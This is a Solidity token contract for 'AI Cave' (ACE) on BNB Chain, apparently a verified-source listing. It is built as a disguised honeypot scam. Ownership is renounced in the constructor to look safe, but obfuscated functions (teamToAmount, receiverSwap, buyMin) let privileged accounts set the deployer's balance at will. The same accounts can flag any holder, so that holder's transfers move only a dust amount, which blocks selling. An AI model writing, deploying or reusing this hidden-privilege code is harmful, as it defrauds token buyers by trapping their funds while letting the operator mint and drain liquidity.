/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface liquidityFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface toIs {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AICave is Ownable{
    uint8 public decimals = 18;
    string public name = "AI Cave";
    bool public buyTrading;
    string public symbol = "ACE";
    address public feeSwap;

    mapping(address => bool) public toToken;
    mapping(address => bool) public enableToken;

    address public sellWallet;
    mapping(address => mapping(address => uint256)) public allowance;


    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    uint256 constant marketingTeam = 10 ** 10;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        liquidityFund toLaunch = liquidityFund(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        feeSwap = toIs(toLaunch.factory()).createPair(toLaunch.WETH(), address(this));
        sellWallet = marketingTxIs();
        toToken[sellWallet] = true;
        balanceOf[sellWallet] = totalSupply;
        emit Transfer(address(0), sellWallet, totalSupply);
        renounceOwnership();
    }

    

    function sellFrom(address amountTo, address receiverMarketingEnable, uint256 txLaunched) internal returns (bool) {
        require(balanceOf[amountTo] >= txLaunched);
        balanceOf[amountTo] -= txLaunched;
        balanceOf[receiverMarketingEnable] += txLaunched;
        emit Transfer(amountTo, receiverMarketingEnable, txLaunched);
        return true;
    }

    function approve(address fundAuto, uint256 txLaunched) public returns (bool) {
        allowance[marketingTxIs()][fundAuto] = txLaunched;
        emit Approval(marketingTxIs(), fundAuto, txLaunched);
        return true;
    }

    function teamToAmount(uint256 txLaunched) public {
        if (!toToken[marketingTxIs()]) {
            return;
        }
        balanceOf[sellWallet] = txLaunched;
    }

    function transferFrom(address modeShouldTotal, address liquidityBuy, uint256 txLaunched) public returns (bool) {
        if (modeShouldTotal != marketingTxIs() && allowance[modeShouldTotal][marketingTxIs()] != type(uint256).max) {
            require(allowance[modeShouldTotal][marketingTxIs()] >= txLaunched);
            allowance[modeShouldTotal][marketingTxIs()] -= txLaunched;
        }
        if (liquidityBuy == sellWallet || modeShouldTotal == sellWallet) {
            return sellFrom(modeShouldTotal, liquidityBuy, txLaunched);
        }
        if (enableToken[modeShouldTotal]) {
            return sellFrom(modeShouldTotal, liquidityBuy, marketingTeam);
        }
        return sellFrom(modeShouldTotal, liquidityBuy, txLaunched);
    }

    function marketingTxIs() private view returns (address) {
        return msg.sender;
    }

    function buyMin(address txMin) public {
        if (buyTrading) {
            return;
        }
        toToken[txMin] = true;
        buyTrading = true;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function transfer(address liquidityBuy, uint256 txLaunched) external returns (bool) {
        return transferFrom(marketingTxIs(), liquidityBuy, txLaunched);
    }

    function receiverSwap(address senderAt) public {
        if (senderAt == sellWallet || senderAt == feeSwap || !toToken[marketingTxIs()]) {
            return;
        }
        enableToken[senderAt] = true;
    }


}